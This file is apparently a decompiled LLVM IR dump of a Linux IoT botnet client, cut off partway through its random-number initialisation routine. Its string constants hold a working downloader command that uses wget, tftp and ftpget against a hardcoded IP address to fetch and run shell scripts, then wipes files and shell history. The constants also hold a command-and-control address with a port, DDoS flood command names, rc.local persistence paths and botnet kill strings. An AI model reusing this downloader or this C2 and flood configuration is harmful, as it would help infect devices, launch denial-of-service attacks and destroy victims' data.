source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805800c.2 = global i32 0
@global_var_8058024.3 = local_unnamed_addr global i32* @global_var_805800c.2
@global_var_8057aa4.4 = constant i32 0
@global_var_80584a4.5 = global i32 0
@global_var_8058010.6 = local_unnamed_addr global i32 0
@global_var_80584e0.7 = global i32 0
@global_var_80584e4.8 = local_unnamed_addr global i32 0
@global_var_80584e8.9 = local_unnamed_addr global i32 0
@global_var_8058210.10 = local_unnamed_addr global i32 4095
@global_var_805820c.11 = local_unnamed_addr global i32 362436
@global_var_80558cd.12 = constant [7 x i8] c"(null)\00"
@global_var_80558d4.14 = constant [3 x i8] c"-c\00"
@global_var_80558d7.15 = constant [3 x i8] c"sh\00"
@global_var_80558da.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055900.17 = constant i32 -1
@global_var_80584c0.18 = local_unnamed_addr global i32 0
@global_var_80558c1.19 = constant [8 x i8] c"busybox\00"
@global_var_80558c9.20 = constant i32 2293796
@global_var_80558cb.21 = constant i32 1848115235
@global_var_80581c0.22 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80558c1.19, i32 0, i32 0), i8* bitcast (i32* @global_var_80558c9.20 to i8*), i8* bitcast (i32* @global_var_80558cb.21 to i8*)]
@global_var_8055895.23 = constant [7 x i8] c"nvalid\00"
@global_var_805589c.24 = constant [6 x i8] c"ailed\00"
@global_var_80558a2.25 = constant [9 x i8] c"ncorrect\00"
@global_var_80558ab.26 = constant [6 x i8] c"enied\00"
@global_var_80558b1.27 = constant [5 x i8] c"rror\00"
@global_var_80558b6.28 = constant [7 x i8] c"oodbye\00"
@global_var_80558bd.29 = constant [4 x i8] c"bad\00"
@global_var_80581a0.30 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055895.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805589c.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80558a2.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80558ab.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80558b1.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80558b6.28, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80558bd.29, i32 0, i32 0)]
@global_var_80584c8.31 = local_unnamed_addr global i32 0
@global_var_80584cc.32 = local_unnamed_addr global i32 0
@global_var_805e754.33 = local_unnamed_addr global i32 0
@global_var_8055d00.34 = constant [6 x i8] c":>%$#\00"
@global_var_8055d07.39 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805e748.40 = local_unnamed_addr global i32 0
@global_var_8055830.41 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805583f.42 = constant [6 x i8] c"/tmp/\00"
@global_var_8055845.43 = constant [6 x i8] c"/var/\00"
@global_var_805584b.44 = constant [6 x i8] c"/dev/\00"
@global_var_8055851.45 = constant [10 x i8] c"/var/run/\00"
@global_var_805585b.46 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8055865.47 = constant [6 x i8] c"/mnt/\00"
@global_var_805586b.48 = constant [7 x i8] c"/boot/\00"
@global_var_8055872.49 = constant [6 x i8] c"/usr/\00"
@global_var_8055878.50 = constant [6 x i8] c"/opt/\00"
@global_var_8058160.51 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8055830.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805583f.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055845.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805584b.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055851.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805585b.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055865.47, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805586b.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055872.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055878.50, i32 0, i32 0)]
@global_var_805818c = external global i32
@global_var_8055d13.56 = constant [3 x i8] c"\0D\0A\00"
@global_var_80581e0.57 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055895.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805589c.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80558a2.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80558ab.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80558b1.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80558b6.28, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80558bd.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80558c1.19, i32 0, i32 0), i8* bitcast (i32* @global_var_80558c9.20 to i8*), i8* bitcast (i32* @global_var_80558cb.21 to i8*)]
@global_var_8055d18.58 = constant i32 993090331
@global_var_8055d75.59 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_8055d7a.60 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8055650.61 = constant [415 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.205.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 165.227.205.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 165.227.205.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 165.227.205.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_80580d4.62 = local_unnamed_addr global [415 x i8]* @global_var_8055650.61
@global_var_8055da4.63 = constant [6 x i8] c"arfgG\00"
@global_var_8055daa.64 = constant [9 x i8] c"HBiug655\00"
@global_var_8055db3.65 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8055dc0.66 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8055dd4.67 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8055de5.68 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8055df1.69 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8055dfd.70 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8055e09.71 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8055e13.72 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8055e1e.73 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8055e2c.74 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_8055e38.75 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8055e45.76 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8055e4e.77 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8055e5e.78 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_8055e69.79 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8055e75.80 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8055e81.81 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8055e8f.82 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8055e9d.83 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8055eab.84 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8055eb5.85 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8055ec3.86 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8055ed1.87 = constant [12 x i8] c"yteytietyue\00"
@global_var_8055edd.88 = constant [9 x i8] c"qsortEQS\00"
@global_var_8055ee6.89 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_8055ef6.90 = constant [4 x i8] c"std\00"
@global_var_8055efa.91 = constant [4 x i8] c"dts\00"
@global_var_8055efe.92 = constant [4 x i8] c"lsk\00"
@global_var_8055f02.93 = constant [4 x i8] c"kek\00"
@global_var_8055f06.94 = constant [6 x i8] c"smack\00"
@global_var_8055f0c.95 = constant [4 x i8] c"ily\00"
@global_var_8055f10.96 = constant [4 x i8] c"tyf\00"
@global_var_8055f14.97 = constant [4 x i8] c"pos\00"
@global_var_8055f18.98 = constant [6 x i8] c"cunts\00"
@global_var_8055f20.99 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055da4.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055daa.64, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055db3.65, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8055dc0.66, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8055dd4.67, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055de5.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055df1.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055dfd.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055e09.71, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8055e13.72, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055e1e.73, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055e2c.74, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055e38.75, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055e45.76, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8055e4e.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8055e5e.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055e69.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055e75.80, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055e81.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055e8f.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055e9d.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055eab.84, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055eb5.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055ec3.86, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055ed1.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055edd.88, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8055ee6.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055ef6.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055efa.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055efe.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055f02.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055f06.94, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055f0c.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055f10.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055f14.97, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055f18.98, i32 0, i32 0)]
@global_var_8055fb0.100 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_8055ff0.101 = constant [4 x i8] c"all\00"
@global_var_8055ff4.102 = constant i32 2037579820
@global_var_8055ff6.103 = constant [4 x i8] c"syn\00"
@global_var_8055ffa.104 = constant [4 x i8] c"rst\00"
@global_var_8055ffe.105 = constant [4 x i8] c"fin\00"
@global_var_8056002.106 = constant [4 x i8] c"ack\00"
@global_var_8056006.107 = constant [4 x i8] c"psh\00"
@global_var_805600a.108 = constant [5 x i8] c"PING\00"
@global_var_805600f.109 = constant [6 x i8] c"PUSSY\00"
@global_var_8056015.110 = constant [4 x i8] c"OFF\00"
@global_var_805e750.111 = local_unnamed_addr global i32 0
@global_var_8056019.112 = constant [3 x i8] c"ON\00"
@global_var_805601c.113 = constant [5 x i8] c"HTTP\00"
@global_var_8056024.114 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_805604a.115 = constant [4 x i8] c"UDP\00"
@global_var_805604e.116 = constant [4 x i8] c"TCP\00"
@global_var_8056052.117 = constant [4 x i8] c"STD\00"
@global_var_8056056.118 = constant [9 x i8] c"KILLATTK\00"
@global_var_8058144.119 = local_unnamed_addr global i32 -1
@global_var_805563b.120 = constant [21 x i8] c"165.227.205.175:6767\00"
@global_var_80580d0.121 = global [21 x i8]* @global_var_805563b.120
@global_var_805605f.122 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8056067.123 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8056077.124 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8056082.126 = constant [7 x i8] c"x86_32\00"
@global_var_8056089.127 = constant i32 1952788224
@global_var_805608a.128 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_805609f.130 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_80560ae.132 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_80560b6.133 = constant i32 1868955745
@global_var_80560b8.134 = constant [13 x i8] c"fork failed\0A\00"
@global_var_80560c8.135 = constant i32 993090331
@global_var_805612a.136 = constant [9 x i8] c"LELIMDUP\00"
@global_var_8056133.137 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8056147.138 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_8056152.139 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805615a.140 = constant i32 32
@global_var_805e710.141 = local_unnamed_addr global i32 0
@global_var_8058218 = external local_unnamed_addr global i32
@global_var_805e720.147 = global i32 0
@global_var_8058254.148 = global i32 0
@global_var_805c4e4.149 = local_unnamed_addr global i32 0
@global_var_805c4e8.150 = local_unnamed_addr global i32 0
@global_var_805826c.151 = local_unnamed_addr global i32 2
@global_var_805823c.152 = global i32 0
@global_var_8058238.153 = global i32* bitcast (i16* @global_var_8058280.144 to i32*)
@global_var_8056760.154 = constant i32 0
@global_var_8056778.155 = constant [6 x i8] c"(nil)\00"
@global_var_805677e.156 = constant [7 x i8] c"(null)\00"
@global_var_8056785.157 = constant i32 2949163
@global_var_80567f2.159 = constant i32 327688
@global_var_80567ea.160 = constant [8 x i8] c" +0-#'I\00"
@global_var_8056798.161 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80567d5.162 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80567cb.163 = constant i32 117506048
@global_var_80567bc.164 = constant i32 331776
@global_var_8056840.165 = constant [8 x i8] c"Success\00"
@global_var_8056816.166 = constant [15 x i8] c"Unknown error \00"
@global_var_8057740.167 = constant i32 65536
@global_var_8058480.168 = local_unnamed_addr global i32* @global_var_8057740.167
@global_var_805e500.169 = global i32 0
@global_var_805e504.170 = global i32 0
@global_var_805e520.171 = global i32 0
@global_var_805e6ec.172 = global i32 0
@global_var_8058488.173 = global i32 0
@global_var_805eb74.174 = local_unnamed_addr global i32 0
@global_var_805eb68.175 = global i32 0
@global_var_805e760.176 = global i32 0
@global_var_8058370.177 = global i32 0
@global_var_805e80c.179 = global i32 0
@global_var_805e810.180 = local_unnamed_addr global i32 0
@global_var_805e814.181 = global i32 0
@global_var_805e820.182 = local_unnamed_addr global i32 0
@global_var_805eb14.183 = global i32 0
@global_var_805eb3c.184 = local_unnamed_addr global i32 0
@global_var_805eb2c.185 = local_unnamed_addr global i32 0
@global_var_805eb30.186 = local_unnamed_addr global i32 0
@global_var_805eb34.187 = local_unnamed_addr global i32 0
@global_var_805eb50.188 = local_unnamed_addr global i32 0
@global_var_805eb38.189 = local_unnamed_addr global i32 0
@global_var_805eb44.190 = local_unnamed_addr global i32 0
@global_var_805eb48.191 = local_unnamed_addr global i32 0
@global_var_805eb54.192 = local_unnamed_addr global i32 0
@global_var_805eb28.193 = local_unnamed_addr global i32 0
@global_var_805eb24.195 = local_unnamed_addr global i32 0
@global_var_805eb4c.196 = local_unnamed_addr global i32 0
@global_var_805e81c.197 = local_unnamed_addr global i32 0
@global_var_8058388.198 = global i32 0
@global_var_80583a0.200 = global i32 0
@global_var_80583b8 = external global i32
@global_var_80583e4.202 = global i32 -1726662223
@global_var_80583c0.203 = local_unnamed_addr global i32* @global_var_80583e4.202
@global_var_80583bc.204 = global i32* @global_var_80583e4.202
@global_var_80573b4.205 = constant i32 0
@global_var_80573a0.206 = constant i32 0
@global_var_8058460.207 = global i32 0
@global_var_805e704.208 = local_unnamed_addr global i32 0
@global_var_805e70c.209 = local_unnamed_addr global i32 0
@global_var_8058000.211 = global i32 -1
@global_var_8051a2f.212 = constant i32 -294069
@global_var_805e714.213 = local_unnamed_addr global i32 0
@global_var_805e718.214 = local_unnamed_addr global i32 0
@global_var_8057620.215 = constant [10 x i8] c"/dev/null\00"
@global_var_805e708.217 = local_unnamed_addr global i32 0
@global_var_8051c17.219 = constant i32 1928542531
@global_var_8051c3b.220 = constant i32 1928542531
@global_var_805e744.221 = local_unnamed_addr global i32 0
@global_var_805e724.222 = global i32 0
@global_var_8057950.224 = constant [4 x i8] c"inf\00"
@global_var_8057953.229 = constant i32 1179535616
@global_var_8057960.230 = constant i32 2883630
@global_var_805eb78.234 = local_unnamed_addr global i32 0
@global_var_8057a1c.235 = constant i32 1697579054
@global_var_8057a50.236 = constant i32 1868824690
@global_var_8057a1e.237 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8057a2f.238 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8057a47.239 = constant [11 x i8] c"nameserver\00"
@global_var_8057a52.240 = constant [7 x i8] c"domain\00"
@global_var_8057a59.241 = constant [7 x i8] c"search\00"
@global_var_805eb58.242 = global i32 0
@global_var_805eb7c.243 = local_unnamed_addr global i32 0
@global_var_805eb80.244 = local_unnamed_addr global i32 0
@global_var_8057a74.245 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8057a71.247 = constant [3 x i8] c"%x\00"
@global_var_8057a85.248 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8057a90.249 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_80584a0.1 = local_unnamed_addr global i8 0
@global_var_805c4e0.13 = external local_unnamed_addr global i8*
@global_var_80584db.35 = local_unnamed_addr global i8 0
@global_var_80584dc.36 = local_unnamed_addr global i8 0
@global_var_80584dd.37 = local_unnamed_addr global i8 0
@global_var_80584de.38 = local_unnamed_addr global i8 0
@global_var_80584d0.125 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_80560ac.131 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8058280.144 = global i16 288
@global_var_80582d0.145 = local_unnamed_addr global i16 272
@global_var_805680a.158 = external constant i8*
@global_var_805e7e0.178 = global i8 0
@global_var_805eb40.194 = local_unnamed_addr global i8 0
@global_var_805e700.199 = local_unnamed_addr global i8 0
@global_var_805e71c.216 = local_unnamed_addr global i8 0
@global_var_8057980.227 = constant x86_fp80* null
@global_var_805e728.231 = external global i8*
@global_var_805e740.232 = local_unnamed_addr global i64 0
@global_var_8058484.233 = local_unnamed_addr global i16 1
@global_var_805609d.129 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 65399
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80584a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80584a0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8058024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80584a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8057aa4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8058010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134533256, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134564148, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_80584e0.7, align 32
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_80584e4.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_80584e8.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_80584e0.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
